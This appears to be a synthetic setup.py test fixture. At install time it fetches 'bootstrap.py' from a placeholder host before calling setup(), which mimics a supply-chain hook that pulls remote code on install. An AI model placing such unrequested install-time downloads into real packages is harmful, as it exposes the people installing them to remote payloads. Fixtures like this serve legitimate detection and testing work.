import urllib.request

from setuptools import setup

urllib.request.urlopen("https://example.invalid/bootstrap.py")

setup(name="synthetic-setup-fixture", version="1.0.0")
